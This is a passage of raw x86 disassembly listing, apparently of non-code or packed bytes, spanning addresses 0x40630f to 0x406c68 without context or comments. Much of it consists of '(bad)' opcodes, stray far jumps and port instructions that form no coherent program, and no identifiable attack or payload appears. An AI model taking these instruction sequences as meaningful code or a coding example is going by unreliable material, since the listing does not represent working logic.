  40630f:	mov    dh,0xc1
  406311:	push   DWORD PTR [ebp+0x2828f2b7]
  406317:	mov    ds:0x4cf17573,eax
  40631c:	adc    al,0xfe
  40631e:	sahf   
	...
  406333:	add    BYTE PTR [ecx-0x16],dl
  406336:	(bad)  
  406338:	jmp    0x4063ad
  40633a:	addr16 inc ecx
  40633c:	xchg   esi,eax
  40633d:	sar    edi,0x85
  406340:	ja     0x406334
  406342:	sub    BYTE PTR [eax],ch
  406344:	mov    ds:0x3ce17573,eax
  406349:	cld    
  40634a:	std    
  40634b:	outs   dx,BYTE PTR ds:[esi]
  40634c:	xor    edx,ebp
  40634e:	mov    ebx,0x67736a1b
  406353:	imul   edx,esi,0xffffffc1
  406356:	inc    eax
  406358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406359:	add    al,BYTE PTR [eax]
  40635b:	imul   edx,DWORD PTR [ecx],0x95107ee
  406361:	jbe    0x406362
  406363:	mov    WORD PTR ds:[ebp+0x32],es
  406367:	test   al,0xa4
  406369:	jmp    0xeb67:0x7363fb95
  406370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406371:	add    al,BYTE PTR [eax-0x1804a8e2]
  406377:	xor    edi,ecx
  406379:	jae    0x40637a
  40637b:	xor    ebp,0x4e004130
  406381:	xor    DWORD PTR [bp+si],0x267ff0f
  406388:	ds (bad) 
  40638a:	jg     0x40638b
  40638c:	mov    bl,0x7
  40638e:	call   0xff2d6f54
  406393:	push   0x412fee
	...
  4063ac:	add    BYTE PTR [esi-0x80],ah
  4063af:	xor    al,BYTE PTR [ecx-0x2]
  4063b2:	add    WORD PTR [eax],ax
  4063b5:	push   cs
  4063b6:	jg     0x4063b7
  4063b8:	jne    0x4063b0
  4063ba:	out    0xa9,al
  4063bc:	std    
  4063bd:	cmp    ebp,ebp
  4063bf:	addr16 mov esp,0x67ff3fec
  4063c5:	jbe    0x4063f7
  4063c7:	inc    ecx
  4063c8:	add    BYTE PTR [esi+0x3e000000],dh
  4063ce:	in     eax,dx
  4063cf:	je     0x4063d9
  4063d1:	es xchg ecx,eax
  4063d3:	std    
  4063d4:	jmp    FWORD PTR [ecx]
  4063d6:	data16 int 0x32
  4063d9:	(bad)  
  4063da:	(bad)  
  4063db:	addr16 test al,0xec
  4063de:	aas    
  4063df:	jmp    DWORD PTR [edi-0x44]
  4063e2:	(bad)  
  4063e3:	(bad)  
  4063e4:	jg     0x4063ef
  4063e6:	bound  eax,QWORD PTR [edi]
  4063e8:	call   0x3f5d67
  4063ed:	shl    WORD PTR [ecx],cl
  4063f0:	inc    ecx
  4063f1:	jle    0x406451
  4063f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f4:	xor    cl,BYTE PTR [edi+0x6]
  4063f7:	push   0x80068e02
  4063fc:	push   DWORD PTR [ebx]
  4063fe:	(bad)  
  4063ff:	out    0x65,eax
  406401:	mov    ebx,0xae68fef7
  406406:	xor    al,0x41
  406408:	add    BYTE PTR [esi],dh
  40640a:	sahf   
  40640b:	xor    al,BYTE PTR [ecx-0x59]
  40640e:	pop    ebx
  40640f:	jmp    0x406412
	...
  406425:	add    BYTE PTR [edi-0x45007ca5],ah
  40642b:	jae    0x406498
  40642d:	dec    esi
  40642e:	cmp    dh,BYTE PTR [ecx+0x74]
  406431:	push   0xffffff8d
  406433:	js     0x406423
  406435:	pop    es
  406436:	aas    
  406437:	arpl   WORD PTR [ebp-0x1],si
  40643a:	and    dh,dl
  40643c:	and    bh,bh
  40643e:	xchg   edx,eax
  40643f:	jae    0x4064ac
  406441:	call   DWORD PTR [edx]
  406443:	pop    ecx
  406444:	je     0x4064b0
  406446:	stos   DWORD PTR es:[edi],eax
  406447:	inc    eax
  406448:	out    dx,al
  406449:	pop    es
  40644a:	imul   esi,DWORD PTR [esi-0x1]
  40644e:	clc    
  40644f:	mov    al,0xee
  406451:	sti    
  406452:	lock cs or al,0xe8
  406456:	jo     0x4063ff
  406458:	je     0x406459
  40645a:	out    dx,al
  40645b:	popf   
  40645c:	(bad)  
  40645d:	push   DWORD PTR [ebx-0xc]
  406460:	adc    WORD PTR [edx+0x67],0x3
  406465:	je     0x4064ab
  406467:	add    esi,DWORD PTR [ebx]
  406469:	xor    esp,DWORD PTR [esi+0x5b]
  40646c:	je     0x4064e3
  40646e:	stos   DWORD PTR es:[edi],eax
  40646f:	xchg   ebx,eax
  406470:	cmc    
  406471:	leave  
  406472:	mov    al,0xf8
  406474:	shl    BYTE PTR [edi-0x59],cl
  406477:	pop    ebx
  406478:	fs mov esi,0x7ede8f7
  40647e:	(bad)  
  40647f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406480:	imul   edi,edi,0xffffff90
  406483:	ret    
  406484:	inc    edi
  406485:	(bad)  
  406486:	mov    al,al
  406488:	jmp    0x0:0x41
	...
  40649f:	mov    ah,0x9a
  4064a1:	add    edi,edi
  4064a3:	repnz pop edi
  4064a5:	imul   ebx,DWORD PTR [ebp+0x5d],0x38
  4064a9:	je     0x4064fb
  4064ab:	call   FWORD PTR [edx+0x3]
  4064ae:	out    dx,eax
  4064af:	and    DWORD PTR [edx],eax
  4064b1:	mov    ecx,0x10fad274
  4064b6:	call   0x47fd:0x6b16713f
  4064bd:	push   cs
  4064be:	je     0x40648f
  4064c0:	xlat   BYTE PTR ds:[ebx]
  4064c1:	mov    ecx,0x747038c2
  4064c6:	pop    es
  4064c7:	aas    
  4064c8:	and    esi,DWORD PTR cs:[eax+ebp*1-0x2e]
  4064cd:	add    BYTE PTR [ecx],0xa7
  4064d0:	popa   
  4064d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064d2:	aam    0x19
  4064d4:	div    eax
  4064d6:	pop    ebx
  4064d7:	(bad)  
  4064d8:	pop    edx
  4064d9:	(bad)  
  4064da:	jae    0x4064db
  4064dc:	jp     0x406485
  4064de:	jae    0x4064e0
  4064e0:	cmp    ebp,DWORD PTR [ebx+0x71d5f8fc]
  4064e6:	pusha  
  4064e7:	lock mul ah
  4064ea:	pop    ebx
  4064eb:	fidivr WORD PTR [ebx]
  4064ed:	scas   al,BYTE PTR es:[edi]
  4064ee:	jae    0x40649c
  4064f0:	inc    edx
  4064f1:	sbb    eax,0xda284f0e
  4064f6:	(bad)  
  4064f7:	rol    al,1
  4064f9:	adc    dl,0xde
  4064fc:	jo     0x40648c
  4064fe:	aam    0x70
  406500:	jno    0x4064fe
  406502:	sti    
	...
  406517:	add    al,al
  406519:	fnstsw WORD PTR [ebp+0x73]
  40651c:	mov    al,0x59
  40651e:	adc    eax,0xa070a84a
  406523:	inc    esi
  406524:	scas   eax,DWORD PTR es:[edi]
  406525:	add    bh,BYTE PTR [esi+edi*2+0x6425848b]
  40652c:	std    
  40652d:	add    dl,BYTE PTR [esi-0x7]
  406530:	cwde   
  406531:	outs   dx,DWORD PTR ds:[esi]
  406532:	aam    0xff
  406534:	xor    DWORD PTR [esi],0x2e61cb9
  40653a:	push   ecx
  40653b:	fistp  DWORD PTR [edi+0x70]
  40653e:	add    BYTE PTR [esi],dh
  406540:	jmp    0x756f:0xa4c3f3c5
  406547:	std    
  406548:	aad    0xf5
  40654a:	or     ebx,DWORD PTR [esi]
  40654c:	mov    ?,edx
  40654e:	sub    BYTE PTR [eax+0x20415aa4],ch
  406554:	mov    ah,0x6f
  406556:	mov    DWORD PTR [eax+ecx*8+0x2ffdffdc],ebp
  40655d:	sbb    bh,bh
  40655f:	jl     0x406589
  406561:	jno    0x406598
  406563:	jns    0x406528
  406565:	sar    edi,0xd0
  406568:	mov    ecx,0x93deff39
  40656d:	(bad)
  406570:	fbld   TBYTE PTR [edi+0x50]
  406573:	into   
  406574:	dec    DWORD PTR [ebx]
  406576:	(bad)  
  406577:	cmp    al,0xa7
  406579:	outs   dx,DWORD PTR ds:[esi]
  40657a:	xor    eax,0x39
	...
  40658f:	add    BYTE PTR [eax],al
  406591:	xchg   edx,eax
  406592:	sar    edi,0xc0
  406595:	xchg   ecx,eax
  406596:	cmp    edi,edi
  406598:	scas   al,BYTE PTR es:[edi]
  406599:	arpl   bp,ax
  40659b:	out    dx,eax
  40659c:	adc    esp,DWORD PTR [ebx+0x55c9756f]
  4065a2:	cmc    
  4065a3:	or     edx,DWORD PTR [esi+0x2828f28f]
  4065a9:	stos   DWORD PTR es:[edi],eax
  4065aa:	pop    edx
  4065ab:	std    
  4065ac:	mov    cl,0x35
  4065ae:	outs   dx,DWORD PTR ds:[esi]
  4065af:	mov    DWORD PTR [edi+eax*2],esp
  4065b2:	jge    0x4065f9
  4065b4:	mov    esp,edx
  4065b6:	jo     0x40662d
  4065b8:	lds    edx,FWORD PTR ds:0xdf660bf6
  4065be:	repnz sub BYTE PTR [eax+0x21e55aa4],ch
  4065c5:	adc    eax,0x8a48970
  4065ca:	test   BYTE PTR [ebp+0x0],bh
  4065cd:	loop   0x4065d2
  4065cf:	je     0x4069af
  4065d5:	std    
  4065d6:	jb     0x4065cf
  4065d8:	add    BYTE PTR [ecx+0x4e008a87],al
  4065de:	add    eax,DWORD PTR [ebx+0xf03ba7d]
  4065e4:	test   BYTE PTR [esi-0x4efffffd],bh
  4065ea:	push   0x27
  4065ec:	(bad)  
  4065ed:	mov    ebx,0x7c2ae76b
  4065f2:	hlt    
  4065f3:	(bad)  
  4065f4:	inc    DWORD PTR [eax]
	...
  40660a:	stos   DWORD PTR es:[edi],eax
  40660b:	(bad)  
  40660d:	jne    0x406615
  40660f:	retf   
  406610:	add    dl,0x1
  406613:	icebp  
  406614:	(bad)  
  406615:	jne    0x40661d
  406617:	icebp  
  406618:	je     0x406622
  40661a:	out    0x6b,al
  40661c:	sar    edi,0xf1
  40661f:	lock je 0x406616
  406622:	loope  0x40669a
  406624:	pop    es
  406625:	call   0x3f2e7f
  40662a:	jg     0x40668b
  40662c:	daa    
  40662d:	adc    ecx,esi
  40662f:	loope  0x4065ee
  406631:	jne    0x406606
  406633:	icebp  
  406634:	je     0x406626
  406636:	xor    DWORD PTR [edi+0x7],esi
  406639:	call   0x3f2ec7
  40663e:	and    eax,0x1675ff04
  406643:	icebp  
  406644:	je     0x406636
  406646:	xor    DWORD PTR [edi+0x7],esi
  406649:	call   0x3f2b23
  40664e:	adc    DWORD PTR [esi-0x15],esi
  406651:	(bad)  
  406652:	jnp    0x4066be
  406654:	out    0x3c,eax
  406656:	mov    esp,0xa783fef3
  40665b:	push   esi
  40665c:	addr16 add bl,bh
  40665f:	jbe    0x4065e5
  406661:	jge    0x4065ea
  406663:	pusha  
  406664:	test   BYTE PTR [esi],0x1c
  406667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406668:	push   DWORD PTR [bx-0x8cc]
  40666d:	pop    es
	...
  406682:	add    BYTE PTR [edi+0x1b],cl
  406685:	inc    ebx
  406686:	call   FWORD PTR [eax+0x11]
  406689:	(bad)  
  40668a:	imul   esp,DWORD PTR [edi+0x3f07f70c],0x40ff42cf
  406694:	std    
  406695:	div    bl
  406697:	dec    edi
  406698:	inc    eax
  406699:	inc    esi
  40669a:	push   DWORD PTR [eax]
  40669c:	ins    DWORD PTR es:[edi],dx
  40669d:	idiv   bl
  40669f:	aas    
  4066a0:	pop    eax
  4066a1:	inc    esi
  4066a2:	jmp    DWORD PTR [eax]
  4066a4:	pop    ebp
  4066a5:	div    bh
  4066a7:	pshufw mm0,QWORD PTR [esi-0x1],0x10
  4066ac:	dec    ebp
  4066ad:	imul   bh
  4066af:	jmp    DWORD PTR [edi+0x46]
  4066b2:	inc    DWORD PTR [eax]
  4066b4:	cmp    eax,0x600febf6
  4066b9:	inc    esi
  4066ba:	push   eax
  4066bc:	lods   al,BYTE PTR ds:[esi]
  4066bd:	mul    bl
  4066bf:	push   DWORD PTR [edi-0x5d1f00b9]
  4066c5:	inc    ebp
  4066c6:	and    al,0xa7
  4066c8:	cs jge 0x4066b7
  4066cb:	es test al,0x73
  4066ce:	test   eax,0xa712db94
  4066d4:	in     al,dx
  4066d5:	mov    al,0x68
  4066d7:	sti    
  4066d8:	test   al,0xc2
  4066da:	dec    DWORD PTR [eax+0x2a]
  4066dd:	xor    al,0x41
  4066df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066e0:	add    esp,DWORD PTR [eax-0x24a419cd]
  4066e6:	mov    eax,ds:0x0
	...
  4066fb:	add    ah,dl
  4066fd:	add    ch,BYTE PTR [eax+0x1a8fff03]
  406703:	ret    
  406704:	mov    ch,ah
  406706:	lea    esi,[esi+eiz*8]
  406709:	add    cl,BYTE PTR [esi-0xa]
  40670c:	lods   al,BYTE PTR ds:[esi]
  40670d:	ins    DWORD PTR es:[edi],dx
  40670e:	mov    esp,0x3edb88fb
  406713:	jo     0x40677d
  406715:	fcmovu st,st(1)
  406717:	add    edx,DWORD PTR [eax-0x54]
  40671a:	shr    DWORD PTR [esi-0x6c],0xc3
  40671e:	call   0xa871bffe
  406723:	add    edi,DWORD PTR [edi+0x40c2da5e]
  406729:	in     eax,0x34
  40672b:	xor    al,0xe6
  40672d:	add    dl,BYTE PTR [ecx-0x173c8bc5]
  406733:	fisttp DWORD PTR [eax+0x31]
  406736:	test   al,0x3
  406738:	and    bh,dh
  40673a:	fdiv   QWORD PTR [eax-0x6e]
  40673d:	cli    
  40673e:	shr    BYTE PTR [ebx],1
  406740:	adc    DWORD PTR [ebp-0x22],ebp
  406743:	fdiv   QWORD PTR [edx+eax*1-0x3070513a]
  40674a:	adc    al,0xc5
  40674c:	clc    
  40674d:	in     al,0x34
  40674f:	cmp    BYTE PTR [esi+0x2],ah
  406752:	push   ecx
  406753:	sub    esi,DWORD PTR [ebx-0x4024173d]
  406759:	sub    BYTE PTR ss:[edi+ecx*2],al
  40675d:	cli    
  40675e:	fadd   st(4),st
	...
  406774:	add    al,dl
  406776:	in     al,0xd2
  406778:	aaa    
  406779:	data16 add dl,BYTE PTR [esi+0x146dacf9]
  406780:	cld    
  406781:	sar    dh,0x86
  406784:	outs   dx,DWORD PTR ds:[esi]
  406785:	mov    al,0x7e
  406787:	and    al,0x70
  406789:	push   edi
  40678a:	ins    DWORD PTR es:[edi],dx
  40678b:	add    ah,bh
  40678d:	mov    al,ds:0xbbf9356d
  406792:	sar    edi,0x50
  406795:	push   esp
  406796:	xchg   ebp,eax
  406797:	add    cl,ch
  406799:	lea    ebp,[ebp+esi*2-0x83a162d]
  4067a0:	jmp    0x2e406a49
  4067a5:	pop    esi
  4067a6:	jo     0x4067a7
  4067a8:	out    0xa4,al
  4067aa:	add    ch,BYTE PTR [edx-0x17]
  4067ad:	jle    0x40681b
  4067af:	imul   ebp,ecx,0xac8c6c7e
  4067b5:	fcom   st(2)
  4067b7:	mov    WORD PTR [edi+ecx*8+0x73],fs
  4067bb:	call   DWORD PTR [esi]
  4067bd:	pop    ebx
  4067be:	ins    DWORD PTR es:[edi],dx
  4067bf:	jne    0x4067d2
  4067c1:	enter  0xfbf5,0x11
  4067c5:	mov    dl,0x94
  4067c7:	add    cl,ch
  4067c9:	sub    eax,0x7deb74ac
  4067ce:	ret    0x867
  4067d1:	mov    ebx,0xfe5ffc1
  4067d6:	clc    
  4067d7:	out    0x8e,eax
	...
  4067ed:	add    BYTE PTR [ecx+0x6b],ah
  4067f0:	jmp    DWORD PTR [edx+0x54]
  4067f3:	jge    0x40677a
  4067f5:	aad    0x71
  4067f7:	imul   edi,edi,0x19
  4067fa:	aad    0x63
  4067fc:	hlt    
  4067fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067fe:	jns    0x40686b
  406800:	mov    DWORD PTR [esp+edx*2+0x73],ebp
  406804:	jmp    FWORD PTR [esi-0x610f4ab7]
  40680a:	inc    ecx
  40680b:	imul   edi,edi,0x14
  40680e:	retf   
  40680f:	arpl   bp,si
  406811:	xchg   edi,eax
  406812:	push   ecx
  406813:	imul   edi,edi,0x54
  406816:	xor    al,0x73
  406818:	inc    DWORD PTR [eax]
  40681a:	sub    eax,ecx
  40681c:	loope  0x4067e1
  40681e:	sub    esp,ebx
  406820:	inc    BYTE PTR [ebp+0x16]
  406823:	leave  
  406824:	xchg   esp,eax
  406825:	call   DWORD PTR [ebx+0x102fe7db]
  40682b:	add    BYTE PTR [eax],al
  40682d:	leave  
  40682e:	mov    esp,0x554ff67
  406833:	int3   
  406834:	add    ah,0xea
  406837:	dec    ecx
  406838:	jmp    FWORD PTR [ecx-0x80]
  40683b:	fdiv   QWORD PTR [eax+ecx*1-0x2a]
  40683f:	hlt    
  406840:	mov    edi,0x44ee99ff
  406845:	cld    
  406846:	data16 arpl WORD PTR [edx],si
  406849:	inc    ecx
  40684a:	fdiv   QWORD PTR ds:[eax+ecx*1-0x4a]
  40684f:	mov    ah,0xfe
  406851:	inc    DWORD PTR [eax]
	...
  406867:	cdq    
  406868:	dec    ecx
  406869:	jmp    DWORD PTR [edi-0x41]
  40686c:	xor    BYTE PTR [ecx+0x0],al
  40686f:	push   ss
  406870:	arpl   WORD PTR [edx],si
  406872:	inc    ecx
  406873:	fdiv   QWORD PTR ds:[eax+esi*2]
  406877:	out    0x45,eax
  406879:	jmp    edi
  40687b:	faddp  st(5),st
  40687d:	(bad)  
  40687e:	call   DWORD PTR ds:0xce0f73bf
  406884:	push   esi
  406885:	(bad)  
  406886:	jne    0x40688e
  406888:	(bad)  
  406889:	xchg   esp,eax
  40688a:	cld    
  40688b:	jmp    0x3dc6506c
  406890:	(bad)  
  406892:	push   0xfffffffe
  406894:	inc    esi
  406895:	loop   0x4068bf
  406897:	pop    DWORD PTR [esi]
  406899:	push   0xff3fdd77
  40689e:	(bad)  
  40689f:	rep outs dx,BYTE PTR ds:[esi]
  4068a1:	sub    BYTE PTR [ecx-0x42],al
  4068a4:	mov    BYTE PTR [ebp+0x6d94a7c6],0xb
  4068ab:	out    0x14,eax
  4068ad:	std    
  4068ae:	dec    edi
  4068af:	push   edi
  4068b0:	test   bh,dh
  4068b2:	pop    es
  4068b3:	mov    edi,0xa0ff700f
  4068b8:	test   cl,cl
  4068ba:	ret    0xd998
  4068bd:	fcos   
  4068bf:	or     bl,ch
  4068c1:	xor    BYTE PTR [ecx-0x59],al
  4068c4:	push   ebx
  4068c5:	out    0x32,eax
  4068c7:	out    0x5b,al
  4068c9:	fild   DWORD PTR [ecx]
	...
  4068df:	add    BYTE PTR [edi-0x2d177ca5],ah
  4068e5:	sbb    DWORD PTR [ebp-0x1],ebp
  4068e8:	pushf  
  4068e9:	sbb    edi,eax
  4068eb:	push   cs
  4068ec:	test   DWORD PTR [ebx-0x3c508a94],0x2150fbc1
  4068f6:	pop    esp
  4068f7:	xor    ah,BYTE PTR [ecx+ecx*1+0x6d]
  4068fb:	push   0xffffffa7
  4068fd:	and    DWORD PTR [eax+0x28],0xffffffe6
  406901:	pop    ebx
  406902:	(bad)  [esi+0x74]
  406905:	call   0x8003:0x5ba56803
  40690c:	push   gs
  40690e:	inc    ebp
  40690f:	call   FWORD PTR [eax]
  406911:	gs inc ebx
  406913:	je     0x4068b5
  406915:	sub    edx,esp
  406917:	(bad)  
  406918:	xchg   edx,eax
  406919:	jae    0x406976
  40691b:	sbb    DWORD PTR [ebx],eax
  40691d:	push   ecx
  40691e:	ins    BYTE PTR es:[edi],dx
  40691f:	call   0xffad05d2
  406924:	jge    0x40698b
  406926:	ins    BYTE PTR es:[edi],dx
  406927:	jne    0x4068c8
  406929:	push   ebx
  40692a:	jmp    0xd9f14a2a
  40692f:	and    bl,al
  406931:	cs cld 
  406933:	out    0x57,eax
  406935:	add    ah,BYTE PTR [ebp-0x3233794]
  40693b:	ins    BYTE PTR es:[edi],dx
  40693c:	cmp    bh,dl
  40693e:	and    ch,0xbc
  406941:	imul   ecx,DWORD PTR [esi+0x6c],0x0
	...
  406957:	add    BYTE PTR [eax],al
  406959:	cmp    ah,BYTE PTR [esi-0x7a]
  40695c:	mul    BYTE PTR [eax-0x5fbbe0a6]
  406962:	imul   esp,DWORD PTR [eax+0x1402a341],0x2d858379
  40696c:	outs   dx,DWORD PTR ds:[esi]
  40696d:	icebp  
  40696e:	rcl    edx,1
  406970:	add    ecx,DWORD PTR ds:0xa0f65602
  406976:	pop    edx
  406977:	jmp    0x70a9d9bf
  40697c:	(bad)  
  40697d:	ins    BYTE PTR es:[edi],dx
  40697e:	jge    0x406974
  406980:	jp     0x406911
  406982:	ret    
  406983:	call   0x1b80400
  406988:	ret    
  406989:	push   eax
  40698a:	jmp    0xf6136d74
  40698f:	nop
  406990:	fnsave [ebx+eax*8-0x18]
  406994:	aam    0x40
  406996:	mov    edi,0xfda70373
  40699b:	sub    bh,dh
  40699d:	mov    eax,edx
  40699f:	adc    bl,bl
  4069a1:	in     al,dx
  4069a2:	push   0x280d2f6
  4069a7:	jmp    0x731abb08
  4069ac:	xor    BYTE PTR [esi+0x2],ah
  4069af:	cmp    DWORD PTR [ebx+0x7a],ebp
  4069b2:	cli    
  4069b3:	ror    dh,0x1
  4069b6:	imul   ecx,esi,0xc644295c
  4069bc:	imul   eax,DWORD PTR [eax],0x0
	...
  4069cf:	add    BYTE PTR [eax],al
  4069d1:	add    BYTE PTR [edi-0x1a],bh
  4069d4:	hlt    
  4069d5:	(bad)  
  4069d6:	loopne 0x4069a7
  4069d8:	inc    eax
  4069da:	mov    ah,0x8f
  4069dc:	add    cl,ch
  4069de:	shr    DWORD PTR [eax+0x60f50674],1
  4069e4:	cmp    ch,BYTE PTR [ebp+0x150694c]
  4069ea:	mov    ds:0xd34fef02,eax
  4069ef:	jp     0x406a25
  4069f1:	sub    BYTE PTR [ebx-0x630b012e],ah
  4069f7:	pusha  
  4069f8:	sub    al,0x8e
  4069fa:	or     al,0x68
  4069fc:	call   0xffa85312
  406a01:	push   edx
  406a02:	mov    ds:0xab1f7fc0,al
  406a07:	in     eax,dx
  406a08:	stc    
  406a09:	scas   eax,DWORD PTR es:[edi]
  406a0a:	add    BYTE PTR [eax+eax*8],dh
  406a0d:	nop
  406a0e:	cld    
  406a0f:	inc    DWORD PTR [bp-0xf]
  406a13:	cwde   
  406a14:	cmp    dh,ah
  406a16:	push   edi
  406a17:	ja     0x406a18
  406a19:	mov    esp,0xe17567c0
  406a1e:	in     al,dx
  406a1f:	scas   al,BYTE PTR es:[edi]
  406a20:	mov    edi,0x5dc7bc26
  406a25:	xor    cl,ch
  406a27:	(bad)  
  406a28:	(bad)  
  406a29:	mov    ebx,0xe96856b9
  406a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a2f:	push   edi
  406a30:	mov    esi,0x412f1091
  406a35:	jmp    0x406a3a
	...
  406a4a:	add    BYTE PTR [ebp+0x17f60bed],cl
  406a50:	add    al,ch
  406a52:	push   es
  406a53:	test   DWORD PTR [edi-0x1],esp
  406a56:	push   ecx
  406a57:	mov    ds:0xdc9fef02,al
  406a5c:	mov    dl,0x34
  406a5e:	sub    BYTE PTR [ebx+0x7ddd7567],ah
  406a64:	in     eax,dx
  406a65:	pop    es
  406a66:	add    dh,dl
  406a68:	int    0xe5
  406a6a:	jmp    DWORD PTR [ecx]
  406a6c:	daa    
  406a6d:	ret    0xce08
  406a70:	push   edx
  406a71:	mov    ch,ah
  406a73:	add    DWORD PTR [ebx+0xb],esi
  406a76:	call   0x3f2ef8
  406a7b:	mov    ch,0xc3
  406a7d:	jae    0x406a99
  406a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a80:	xchg   esp,eax
  406a81:	xor    al,0x41
  406a83:	mov    esi,0xfbd8e753
  406a88:	fdiv   st(6),st
  406a8a:	push   eax
  406a8b:	mov    esi,0x260874db
  406a90:	mov    bh,bh
  406a92:	inc    DWORD PTR [ecx]
  406a94:	int3   
  406a95:	aad    0xc1
  406a97:	add    ebp,ebx
  406a99:	enter  0x76c2,0x3
  406a9d:	push   ebp
  406a9e:	mov    esp,edx
  406aa0:	add    ah,0xfc
  406aa3:	add    ebp,DWORD PTR fs:[edx+0x8]
  406aa7:	loope  0x406b1b
  406aa9:	pop    es
  406aaa:	call   0x400495
	...
  406ac3:	add    bh,al
  406ac5:	inc    edx
  406ac6:	sti    
  406ac7:	push   0x3e
  406ac9:	dec    ebx
  406aca:	mov    BYTE PTR ds:0xb66802ff,dh
  406ad0:	pop    edx
  406ad1:	ds (bad) 
  406ad3:	(bad)  
  406ad4:	pop    ebx
  406ad5:	jae    0x406aff
  406ad7:	inc    ecx
  406ad8:	ds retf 
  406ada:	mov    ebp,0xadca1c4
  406adf:	rcr    BYTE PTR [edx+0xf684ff7],0x3
  406ae6:	out    dx,eax
  406ae7:	mov    esi,0x874dc2e
  406aec:	neg    BYTE PTR [esi-0x1e]
  406aef:	jmp    ecx
  406af1:	lds    ecx,FWORD PTR [ebp+0x6950a7c1]
  406af7:	push   0xffffffa7
  406af9:	sar    DWORD PTR [edx+0x35],0x66
  406afd:	pop    ecx
  406afe:	fcmovnu st,st(2)
  406b00:	fwait
  406b01:	sbb    al,BYTE PTR [edi+edi*8]
  406b04:	xchg   edx,eax
  406b05:	sub    DWORD PTR [ebx],ebx
  406b07:	inc    ecx
  406b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b09:	inc    ecx
  406b0a:	jns    0x406ad0
  406b0c:	enter  0xfd9f,0xbf
  406b10:	cmp    ebp,DWORD PTR [ebp-0x2d]
  406b13:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  406b15:	pop    ecx
  406b16:	pop    eax
  406b17:	mov    esi,0x7ef7857
  406b1c:	mov    edi,0xa0ff652e
  406b21:	xchg   esp,eax
  406b22:	leave  
  406b23:	rcr    BYTE PTR [eax+0xffdded],0x0
	...
  406b3a:	add    BYTE PTR [eax],al
  406b3c:	add    BYTE PTR [eax],cl
  406b3e:	shr    DWORD PTR [esi],cl
  406b40:	inc    ecx
  406b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b42:	push   ebx
  406b43:	push   cs
  406b44:	xor    eax,0x35685be6
  406b49:	test   DWORD PTR [edx],0x3c88ffc3
  406b4f:	aas    
  406b50:	jmp    FWORD PTR [eax+0x71]
  406b53:	inc    ebx
  406b54:	je     0x406b06
  406b56:	mov    edx,ebx
  406b58:	(bad)  
  406b59:	shl    BYTE PTR [ebx+0x5b],cl
  406b5c:	or     dl,BYTE PTR [eax+0x15]
  406b5f:	imul   ebp,eax,0xff691a92
  406b65:	int    0x5b
  406b67:	fistp  DWORD PTR [eax+0x68039a72]
  406b6d:	jb     0x406bbd
  406b6f:	ret    0x29ff
  406b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b73:	repz sub BYTE PTR [esi+0x5b],ah
  406b77:	pop    ebx
  406b78:	ss jecxz 0x406be7
  406b7b:	push   0xf7efe70b
  406b80:	dec    edi
  406b81:	ja     0x406b85
  406b83:	out    0xee,al
  406b85:	test   al,0x5a
  406b87:	leave  
  406b88:	imul   edi,eax,0xe7fcc165
  406b8e:	gs into 
  406b90:	fucomp st(0)
  406b92:	fisttp QWORD PTR [edx+0x5102662e]
  406b98:	out    dx,al
  406b99:	xchg   ebx,eax
  406b9a:	ret    
  406b9b:	call   0x330608
  406ba0:	ret    0x0
	...
  406bb3:	add    BYTE PTR [eax],al
  406bb5:	add    al,cl
  406bb7:	pop    ebp
  406bb8:	cmc    
  406bb9:	aas    
  406bba:	shl    BYTE PTR [ebp-0xe],0x43
  406bbe:	xor    esi,ebp
  406bc0:	cmp    ah,dl
  406bc2:	mov    cl,0xef
  406bc4:	loopne 0x406c21
  406bc6:	icebp  
  406bc7:	xchg   BYTE PTR fs:[eax-0x71],ch
  406bcb:	arpl   WORD PTR [ecx-0x2b276798],bp
  406bd1:	push   0x4b80fb1a
  406bd6:	mov    DWORD PTR [ebp+0x66],esp
  406bd9:	fstp   QWORD PTR [esi-0x7f042b9b]
  406bdf:	xor    al,0x57
  406be1:	push   0x6909d870
  406be6:	repnz cli 
  406be8:	push   eax
  406be9:	aas    
  406bea:	popa   
  406beb:	gs ds push 0xee3666d2
  406bf2:	test   al,0x5a
  406bf4:	imul   DWORD PTR [ecx+0x45306548]
  406bfa:	stos   DWORD PTR es:[edi],eax
  406bfb:	add    dh,BYTE PTR [esp+edi*2-0x8639ab5]
  406c02:	dec    eax
  406c03:	push   0x25
  406c05:	push   0xef28f928
  406c0a:	jb     0x406be6
  406c0c:	cmp    DWORD PTR [esi],ebp
  406c0e:	data16 add al,BYTE PTR [eax]
  406c11:	cdq    
  406c12:	ins    BYTE PTR es:[edi],dx
  406c13:	ja     0x406bd9
  406c15:	out    dx,al
  406c16:	adc    dl,0x4f
  406c19:	cmp    DWORD PTR [eax],eax
	...
  406c2f:	jecxz  0x406c95
  406c31:	dec    esi
  406c33:	inc    ecx
  406c34:	fisubr DWORD PTR [ebp+0x4f64ea1c]
  406c3a:	into   
  406c3b:	idiv   ah
  406c3d:	out    0x1a,eax
  406c3f:	inc    esi
  406c40:	jmp    DWORD PTR gs:[ecx]
  406c43:	sti    
  406c44:	add    DWORD PTR [eax],eax
  406c46:	(bad)  
  406c47:	or     edx,ebx
  406c49:	mov    esp,0x4f64e3f4
  406c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c4f:	mov    dh,0xfc
  406c51:	out    0xde,eax
  406c53:	inc    edi
  406c54:	push   DWORD PTR gs:[ecx]
  406c57:	rol    DWORD PTR [edx],cl
  406c59:	add    BYTE PTR [esi+0x1],bh
  406c5c:	fcmove st,st(2)
  406c5e:	mov    esp,0x7e4f646b
  406c63:	xchg   esi,eax
  406c64:	cld    
  406c65:	out    0xc2,eax
  406c67:	pop    es
  406c68:	inc    DWORD PTR fs:[ecx+0x66ffa458]
